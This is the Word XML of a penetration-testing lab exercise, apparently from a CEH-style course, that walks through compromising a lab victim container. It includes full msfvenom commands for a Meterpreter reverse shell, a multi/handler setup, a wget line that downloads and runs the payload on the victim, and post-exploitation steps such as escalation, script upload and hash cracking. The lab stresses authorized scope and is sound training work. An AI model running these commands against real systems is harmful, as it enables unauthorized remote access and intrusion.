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F1492" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000" w:rsidP="00C70875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5AC4F5E3" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000" w:rsidP="00C70875">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="243027"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TCL 21 — How to Gain and Escalate a Shell with a Custom Payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5119DEEE" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000" w:rsidP="00C70875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40615D3A" w14:textId="77777777" w:rsidR="00C70875" w:rsidRDefault="00C70875" w:rsidP="00C70875">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:color w:val="4A564D"/>
          <w:sz w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7343FE37" w14:textId="77777777" w:rsidR="00C70875" w:rsidRDefault="00C70875" w:rsidP="00C70875">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:color w:val="4A564D"/>
          <w:sz w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A10BD0D" w14:textId="77777777" w:rsidR="00C70875" w:rsidRDefault="00C70875" w:rsidP="00C70875">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="688A25A7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16D365AA" w14:textId="77777777" w:rsidR="00134CB0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21 focuses on: building a payload, gaining a session, escalating privilege, and operating on a compromised host with Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EFF71C" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>Objectives:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE7CA87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Identify a target and a matching payload with Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D51A9B0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Build a payload with msfvenom and host it for delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E7762A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Catch a session with a multi/handler and interact via Meterpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAD1010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Escalate privilege, modify the file system, and upload and execute a script on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4DF161" w14:textId="77777777" w:rsidR="00134CB0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134CB0" w14:paraId="56246FF1" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E3E9E3"/>
          </w:tcPr>
          <w:p w14:paraId="6531FF96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4A27062B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134CB0" w14:paraId="052E0128" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EE765F6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msfvenom</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E3F8069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Payload generation — CEH “System Hacking” domain</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00134CB0" w14:paraId="4B157127" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="50EF1A2C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msfconsole / multi-handler</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7FCBDE20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Catching and managing sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00134CB0" w14:paraId="329342EB" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="10A2C4DB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Meterpreter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F66B74F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Post-exploitation interaction with the compromised host</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00134CB0" w14:paraId="2CD0A48F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="567AF674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John the Ripper</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4770" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="464DAC1D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Cracking any hashes recovered post-exploitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B45DB7D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2022693" w14:textId="77777777" w:rsidR="00134CB0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34CB0" w14:paraId="3623BB63" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E3E9E3"/>
          </w:tcPr>
          <w:p w14:paraId="478E98EA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448D15BC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7387A722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134CB0" w14:paraId="6D79647B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13D89E5B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783FD748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4432D746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Turning a confirmed weakness into a working session, then operating within scope, is the demonstrated-impact step a vulnerability assessment builds toward.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6510AA88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134CB0" w14:paraId="0B658E38" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1908" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E3E9E3"/>
          </w:tcPr>
          <w:p w14:paraId="4B6B1A2B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66D7B9A3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7CF99022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0D1B541A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6C762490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134CB0" w14:paraId="4B12B0D0" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1908" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="520DAF04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20020E4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09FAAF03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7118B405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5BBF0AEB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134CB0" w14:paraId="72B86393" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1908" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2715F46E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104EE3C6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3D84E52B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2E586BFA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113328FE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26D0ED4C" w14:textId="77777777" w:rsidR="00134CB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EA877D" wp14:editId="7A5C7E74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4FDB" w14:textId="77777777" w:rsidR="00134CB0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170056D5" w14:textId="77777777" w:rsidR="00134CB0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30FEDCB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15223201" w14:textId="77777777" w:rsidR="00134CB0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BE51F1D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Identify a target and a matching payload with Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE788B4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Build a payload with msfvenom and host it for delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7074542E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Catch a session with a multi/handler and interact via Meterpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CE4D0A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Escalate privilege, modify the file system, and upload and execute a script on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6E5ADD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4CB0" w14:paraId="6E0A708B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9540" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DBE9E4"/>
          </w:tcPr>
          <w:p w14:paraId="36A0AF25" w14:textId="77777777" w:rsidR="00134CB0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4D6BF6A2" w14:textId="77777777" w:rsidR="00134CB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“Now the part the board remembers,” Nadia says. “Not ‘it could be exploited’ — an actual session on the box. Build the payload yourself so you understand every option, catch the shell, and show what an attacker does once inside.”</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41E176AC" w14:textId="77777777" w:rsidR="00134CB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is firm on scope. “The victim container (10.30.0.30), nothing else, ever. A shell you can't explain is worse than no shell.”</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01928BD1" w14:textId="77777777" w:rsidR="00134CB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build and deliver a payload to the victim, obtain a Meterpreter session, escalate, and operate on the host within scope.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="218C775D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24CBFB2F" w14:textId="77777777" w:rsidR="00134CB0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40701018" w14:textId="77777777" w:rsidR="00134CB0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26263047" w14:textId="77777777" w:rsidR="00134CB0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2216D92E" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>1. Confirm the target is up and note its services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619674D4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-sV 10.30.0.30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640CCEEB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exploitable services on the victim.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6AE868" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>2. Build a Linux reverse-shell payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5262D238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msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.30.0.10 LPORT=4444 -f elf -o /root/shell.elf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34279286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shell.elf written.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2CF2E6" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>3. Host the payload for delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706F41AF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cd /root &amp;&amp; python3 -m http.server 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7737D892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an HTTP server serving shell.elf.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347C5EF0" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>4. Start the handler (new terminal).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2252E772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msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.30.0.10; set LPORT 4444; run'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6185B41D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handler listening.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615BA31C" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>5. Deliver and run the payload on the victim, then catch the session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138D5C91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on victim: wget http://10.30.0.10:8080/shell.elf -O /tmp/s; chmod +x /tmp/s; /tmp/s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3124CFAA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Meterpreter session opening on the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3F6DF1" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>6. Operate on the host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5869B7CD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sysinfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABD1A0C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getuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739D31BF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upload /root/task.sh /tmp/task.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708A6219" w14:textId="77777777" w:rsidR="00134CB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shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E240B6" w14:textId="77777777" w:rsidR="00134CB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host details, your uid, and your script on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD941B0" w14:textId="77777777" w:rsidR="00134CB0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From the session, find and read one sensitive file within scope, and note how you would detect this activity as a defender.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B9BFEC" w14:textId="77777777" w:rsidR="00134CB0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0B04A96A" w14:textId="77777777" w:rsidR="00134CB0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4CE3F178" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>1. Open the attacker and confirm the target with a quick scan of the victim (10.30.0.30).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB357A4" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>2. Choose a suitable payload and build it with msfvenom (a Linux reverse shell for the Metasploitable victim), setting LHOST to the attacker (10.30.0.10).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E36209E" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3. Host the payload (Metasploit's web server, or a simple HTTP server) so the target can retrieve it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8E38C4" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>4. Start a multi/handler in msfconsole matching your payload, then trigger/deliver the payload to open a session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5424C2A5" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>5. In the session, enumerate the host, escalate privilege where possible, and read the current user/ID.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214C0F22" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>6. Modify the file system within scope: upload a small bash script and execute it, then confirm its output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DED40FF" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>7. If you recover any password hashes, crack them with John (your own authorized target only).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4CB0" w14:paraId="3D490B7E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9540" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEE7F1"/>
          </w:tcPr>
          <w:p w14:paraId="11E378F1" w14:textId="77777777" w:rsidR="00134CB0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5EA3643B" w14:textId="77777777" w:rsidR="00134CB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msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.30.0.10 LPORT=4444 -f elf -o shell.elf. Host it with python3 -m http.server. Catch it: use exploit/multi/handler, set PAYLOAD to match, set LHOST/LPORT, run. In Meterpreter: sysinfo, getuid, upload, shell. On Metasploitable, a direct service exploit (e.g. vsftpd) is an alternative route to the same session.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="364AB55E" w14:textId="77777777" w:rsidR="00134CB0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B1CB3C2" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>Prove impact on the victim — and only the victim. Get a session and answer the flags.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134CB0" w14:paraId="579C22CA" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E3E9E3"/>
          </w:tcPr>
          <w:p w14:paraId="472906CC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0BF69A8D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E93CFEB" w14:textId="77777777" w:rsidR="00134CB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134CB0" w14:paraId="2BE28237" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BEF96F9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17F7E09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23130639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payload type you used to get a session.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00134CB0" w14:paraId="2FCCE08E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2BAA32BA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3B68CCA2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3E7F2C22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uid/username your session runs as (and after any escalation).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00134CB0" w14:paraId="5ABF5E8B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3180" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61CF7702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6F15763E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256625A8" w14:textId="77777777" w:rsidR="00134CB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output of a script you uploaded and executed on the target.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A9AE364" w14:textId="77777777" w:rsidR="00134CB0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23127EEC" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00134CB0">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="179BE680" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>Debrief</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E669E8" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>Metasploit collapses the gap between ‘vulnerable’ and ‘compromised,’ which is exactly why scope discipline is the first skill. Building the payload by hand teaches what each option does; the session is the artifact the board can't wave away. Its legitimacy rests entirely on ‘only the host we were authorized to test.’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C79C5F7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16AC8906" w14:textId="77777777" w:rsidR="00134CB0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4115B0E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Screenshot of your msfvenom payload build (showing payload, LHOST, format).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DF2AE9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Screenshot of the multi/handler catching the session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047E0C08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Screenshot of a Meterpreter command proving access (sysinfo / getuid).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A04B25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Screenshot of your uploaded script executing on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6FCC25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A brief report: the access gained, what you demonstrated, and the remediation, for Helen Cho.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF76B19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lab21.txt , then last -n 10 &gt;&gt; lab21.txt , then  cat lab21.txt  — screenshot the output of that final cat command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D49F1C" w14:textId="77777777" w:rsidR="00134CB0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52E8C6C5" w14:textId="77777777" w:rsidR="00134CB0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471E45FD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Metasploit Unleashed (Offensive Security)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6FCD41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msfvenom documentation (Rapid7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F22285B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Meterpreter command reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C72FA8F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MITRE ATT&amp;CK — Privilege Escalation (TA0004)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72030F12" w14:textId="77777777" w:rsidR="00134CB0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="243027"/>
        </w:rPr>
        <w:t>• [Video] msfvenom &amp; multi/handler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134CB0" w14:paraId="5E429F7E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9540" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F4E3CC"/>
          </w:tcPr>
          <w:p w14:paraId="7A661E8C" w14:textId="77777777" w:rsidR="00134CB0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3AAEC830" w14:textId="77777777" w:rsidR="00134CB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3CED9E9B" w14:textId="77777777" w:rsidR="00D17609" w:rsidRDefault="00D17609"/>
    <w:sectPr w:rsidR="00D17609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96957">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1084911100">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1309630193">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1149908835">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2136364593">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1585605668">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="597755606">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="815071298">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="26683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B0"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C70875"/>
    <w:rsid w:val="00C9221E"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D176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66F1E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2026-10-03T00:44:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>